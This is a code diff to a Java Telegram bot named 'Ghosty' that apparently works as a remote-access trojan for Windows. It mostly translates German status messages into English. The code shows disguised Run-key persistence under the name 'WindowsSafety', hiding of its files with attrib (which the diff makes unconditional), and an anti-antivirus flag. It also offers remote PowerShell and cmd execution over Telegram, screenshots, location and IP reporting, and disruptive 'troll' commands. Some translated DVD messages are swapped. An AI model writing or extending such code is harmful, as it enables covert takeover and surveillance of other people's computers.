@@ -37,6 +37,7 @@ import java.util.Date;
  * Created by Alexander Ressl on 10.04.2017 12:12.
  */
 public class Bot extends TelegramLongPollingBot {
+
     Config config;
     boolean hidden;
     boolean autostart;
@@ -64,7 +65,7 @@ public class Bot extends TelegramLongPollingBot {
     Thread run = new Thread(lowRam);
     TaskColor color = new TaskColor(this);
     Detect detct = null;
-    private boolean webseite = false;
+    private boolean website = false;
     boolean sicher = false;
     int wo = 0;
     int menu = -1;
@@ -122,13 +123,12 @@ public class Bot extends TelegramLongPollingBot {
             }
             if (!silent)
                 if (args.length == 0)
-                    sendNachricht("Gerät gestartet!\nEs ist gerade: " + time + " " + IP.getIP() + "\n" + wer);
+                    sendNachricht("Device booted!\nTime: " + time + " " + IP.getIP() + "\n" + wer);
                 else
-                    sendNachricht("Prozess wurde unerwartet geschlossen! Da \"unkillable\" ausgewählt wurde hat sich der Prozess neu gestartet.\nEs ist gerade: " + time + " " + IP.getIP() + "\n" + wer);
+                    sendNachricht("Ghosty has been closed unexpectedly! Process restarted successfully.\nTime: " + time + " " + IP.getIP() + "\n" + wer);
         }
         if (!config.getName().contains(";")) {
             config.setName(this.name + ";");
-            System.out.println("Pika");
             sendNachricht("Changelog:\n" + changelog);
             writeConf();
         }
@@ -183,7 +183,7 @@ public class Bot extends TelegramLongPollingBot {
                 try {
                     Reg.writeStringValue(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety", getAbsolutePfad());
                     if (!antiAV)
-                        sendNachricht("Schreibe mich in die Autostart!");
+                        sendNachricht("Hijacking startup!");
                 } catch (Exception e) {
                     sendNachricht(e.toString());
                 }
@@ -191,18 +191,18 @@ public class Bot extends TelegramLongPollingBot {
                 checkrun.setDaemon(true);
                 checkrun.start();
                 if (!antiAV)
-                    sendNachricht("TaskChecker startet..");
+                    sendNachricht("TaskChecker loaded!");
+            }
+            try {
+                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\botconf.bot" + "\"");
+            } catch (IOException ek) {
+                System.out.println(ek + " HIDE");
             }
             if (hidden) {
                 try {
                     Runtime.getRuntime().exec("cmd /c attrib +h \"" + getPfad() + getName() + "\"");
                 } catch (IOException e) {
                     sendNachricht("FEHLER beim Datei verstecken machen \n" + e.toString());
-                }
-                try {
-                    Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\botconf.bot" + "\"");
-                } catch (IOException ek) {
-                    System.out.println(ek + " HIDE");
                 }
             }
             try {
@@ -247,7 +247,7 @@ public class Bot extends TelegramLongPollingBot {
                 String pfad = System.getProperty("user.home") + "\\IO.jar";
                 Files.move(fileFromSystem.toPath(), (new java.io.File(pfad)).toPath(), StandardCopyOption.REPLACE_EXISTING);
                 sendNachrichtAdmin("FILE MOVED");
-                sendNachricht("Update wird durchgeührt!\nBitte das Gerät in der nächsten Minute nicht herunterfahren.");
+                sendNachricht("Updating!\nPlease do not turn off your device in the next minute.");
                 File datei = new File(pfad);
                 config.setName(this.name.replace(";", ""));
                 writeConf();
@@ -298,14 +298,14 @@ public class Bot extends TelegramLongPollingBot {
                 }
             else {
                 menu = -1;
-                sendNachricht("Herunterfahren abgebrochen");
+                sendNachricht("Shutdown canceled");
             }
         }
         if (nachricht.equalsIgnoreCase("shutdown")) {
             shutdown = true;
             wo = 0;
             menu = 100;
-            sendNachricht("Wirklich herunterfahren?");
+            sendNachricht("Do you wanna turn off the device?");
         }
         if (restart) {
             restart = false;
@@ -327,14 +327,14 @@ public class Bot extends TelegramLongPollingBot {
                 }
             else {
                 menu = -1;
-                sendNachricht("Beenden abgebrochen");
+                sendNachricht("Restarting canceled.");
             }
         }
         if (nachricht.equalsIgnoreCase("restart")) {
             restart = true;
             wo = 0;
             menu = 100;
-            sendNachricht("Wirklich restarten?");
+            sendNachricht("Do you wanna reboot the device?");
         }
         if (nachricht.toLowerCase().contains("powershell")) {
             String code;
@@ -425,14 +425,14 @@ public class Bot extends TelegramLongPollingBot {
                 System.exit(0);
             } else {
                 menu = -1;
-                sendNachricht("Beenden abgebrochen");
+                sendNachricht("Closing canceled");
             }
         }
-        if (nachricht.equalsIgnoreCase("beenden")) {
+        if (nachricht.equalsIgnoreCase("close")) {
             sicher = true;
             wo = 0;
             menu = 100;
-            sendNachricht("Wirklich beenden?");
+            sendNachricht("Do you wanna close Ghosty?");
         }
         if (nachricht.equalsIgnoreCase("retry")) {
             sendNachricht("Restarting. . .");
@@ -441,27 +441,27 @@ public class Bot extends TelegramLongPollingBot {
         if (nachricht.equalsIgnoreCase("menu")) {
             wo = 0;
             menu = -1;
-            sendNachricht("Menü");
+            sendNachricht("Menu.");
         }
         if (nachricht.equalsIgnoreCase("leave")) {
             wo = 0;
             menu = -1;
-            sendNachricht("Gehe zurück");
+            sendNachricht("Going back.");
         }
         if (nachricht.equalsIgnoreCase("fun") && troll) {
             wo = 0;
             menu = 0;
-            sendNachricht("Fun");
+            sendNachricht("Fun Menu.");
         }
         if (nachricht.equalsIgnoreCase("info")) {
             wo = 0;
             menu = 1;
-            sendNachricht("Infos");
+            sendNachricht("Info menu.");
         }
         if (nachricht.equalsIgnoreCase("Tools")) {
             wo = 0;
             menu = 2;
-            sendNachricht("Tools");
+            sendNachricht("Tool menu.");
         }
         if (nachricht.equalsIgnoreCase("Music")) {
             wo = 0;
@@ -470,11 +470,11 @@ public class Bot extends TelegramLongPollingBot {
         }
         if (nachricht.equalsIgnoreCase("forward")) {
             wo++;
-            sendNachricht("Nächste Seite");
+            sendNachricht("Next Page.");
         }
         if (nachricht.equalsIgnoreCase("back") && wo > 0) {
             wo--;
-            sendNachricht("Vorherige Seite");
+            sendNachricht("Previous Page.");
         }
         if (nachricht.equalsIgnoreCase("lock")) {
             try {
@@ -482,10 +482,10 @@ public class Bot extends TelegramLongPollingBot {
             } catch (IOException e) {
                 e.printStackTrace();
             }
-            sendNachricht("Gerät gesperrt!");
+            sendNachricht("Device locked!");
         }
         if (nachricht.equalsIgnoreCase("ChangePW")) {
-            sendNachricht("Bitte geben Sie ihr neues Passwort auf dem Gerät ein.");
+            sendNachricht("Please enter you new password on the device.");
             JPanel panel = new JPanel();
             JLabel label = new JLabel("Please enter your new password:");
             JPasswordField pass = new JPasswordField(10);
@@ -495,7 +495,7 @@ public class Bot extends TelegramLongPollingBot {
             panel.add(pass1);
             panel.grabFocus();
             String[] options = new String[]{"OK", "Cancel"};
-            int option = JOptionPane.showOptionDialog(null, panel, "Passwort",
+            int option = JOptionPane.showOptionDialog(null, panel, "Password",
                     JOptionPane.NO_OPTION, JOptionPane.PLAIN_MESSAGE,
                     null, options, options[0]);
 
@@ -519,17 +519,17 @@ public class Bot extends TelegramLongPollingBot {
         if (troll) {
             if (nachricht.equalsIgnoreCase("DVD open")) {
                 CDUtils.open();
-                sendNachricht("DVD Laufwerk öffnet sich!");
+                sendNachricht("DVD drive closing!");
             }
             if (nachricht.equalsIgnoreCase("DVD close")) {
                 CDUtils.close();
-                sendNachricht("DVD Laufwerk schließt sich!");
+                sendNachricht("DVD drive opening!");
             }
             if (nachricht.equalsIgnoreCase("Caps Fucker")) {
                 if (capsFuck.isCapsfuck())
-                    sendNachricht("Die Caps-Taste geht wieder.");
+                    sendNachricht("Caps-Lock is working again.");
                 else
-                    sendNachricht("Capslock defekt!");
+                    sendNachricht("Caps-Lock malfunction.");
                 capsFuck.setCapsfuck(!capsFuck.isCapsfuck());
             }
 
@@ -568,23 +568,23 @@ public class Bot extends TelegramLongPollingBot {
                 }
 
             }
-            if (webseite) {
+            if (website) {
                 try {
                     sendNachricht("Wird geöffnet");
                     Runtime.getRuntime().exec("cmd /c start " + nachricht);
-                    webseite = false;
+                    website = false;
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
             }
-            if (nachricht.equalsIgnoreCase("webseite")) {
+            if (nachricht.equalsIgnoreCase("website")) {
                 sendNachricht("URL schicken.");
-                webseite = true;
+                website = true;
             }
 
             if (nachricht.equalsIgnoreCase("nobrain")) {
                 try {
-                    sendNachricht("Oh nette Webseite.");
+                    sendNachricht("Oh nette website.");
                     Runtime.getRuntime().exec("cmd /c start iexplore www.nobrain.dk");
                 } catch (IOException e) {
                     e.printStackTrace();
@@ -1069,11 +1069,11 @@ public class Bot extends TelegramLongPollingBot {
                 else
                     return "Info,Tools,Music";
             case 0:
-                return "DVD open,DVD close,Webseite,Dog cleaner,Strange,Walk,Caps Fucker,Windows Fucker,Screen Fucker,Mouse Fucker,All Fucker,nobrain,bluescreen,scare";
+                return "DVD open,DVD close,website,Dog cleaner,Strange,Walk,Caps Fucker,Windows Fucker,Screen Fucker,Mouse Fucker,All Fucker,nobrain,bluescreen,scare";
             case 1:
                 return "Screenshot,Uptime,Wer,BatteryInformation,Location,Version,Path,Name,Pic,OperatingSystem,IP";
             case 2:
-                return "Shutdown,Restart,Black,Lock,Alarm,Autolock,Sleep,Beenden,Retry,ChangePW,Powershell,Uninstall,BotReset,Tarn,Cmd,Autostart";
+                return "Shutdown,Restart,Black,Lock,Alarm,Autolock,Sleep,Close,Retry,ChangePW,Powershell,Uninstall,BotReset,Tarn,Cmd,Autostart";
             case 3:
                 return "Down,Un-/Mute,Up,Previous,Play/Pause,Next";
             case 100:
